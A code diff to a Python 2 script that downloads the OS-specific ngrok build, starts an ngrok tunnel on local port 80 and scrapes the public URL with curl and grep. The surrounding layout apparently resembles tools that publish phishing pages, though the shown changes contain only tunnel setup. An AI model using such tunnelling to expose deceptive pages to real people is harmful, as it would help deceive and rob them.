@@ -8,7 +8,7 @@ from sys import stdout, exit
 from os import system, path
 import multiprocessing
 from urllib import urlopen
-from platform import architecture
+from platform import system as systemos, architecture
 from wget import download
 
 RED, WHITE, CYAN, GREEN, END = '\033[91m', '\33[46m', '\033[36m', '\033[1;32m', '\033[0m'
@@ -32,10 +32,11 @@ if connected() == False:
 def checkNgrok():
     if path.isfile('Server/ngrok') == False: 
         print '[*] Downloading Ngrok...'
+        ostype = systemos().lower()
         if architecture()[0] == '64bit':
-            filename = 'ngrok-stable-linux-amd64.zip'
+            filename = 'ngrok-stable-{0}-amd64.zip'.format(ostype)
         else:
-            filename = 'ngrok-stable-linux-386.zip'
+            filename = 'ngrok-stable-{0}-386.zip'.format(ostype)
         url = 'https://bin.equinox.io/c/4VmDzA7iaHb/' + filename
         download(url)
         system('unzip ' + filename)
@@ -176,7 +177,7 @@ def runPEnv():
 def runNgrok():
     system('./Server/ngrok http 80 > /dev/null &')
     sleep(10)
-    system('curl -s http://127.0.0.1:4040/status | grep -P "https://.*?ngrok.io" -oh > ngrok.url')
+    system('curl -s -N http://127.0.0.1:4040/status | grep "https://[0-9a-z]*\.ngrok.io" -oh > ngrok.url')
     url = open('ngrok.url', 'r')
     print('\n {0}[{1}*{0}]{1} Ngrok URL: {2}' + url.readlines()[0] + '{1}').format(CYAN, END, GREEN)
     url.close()
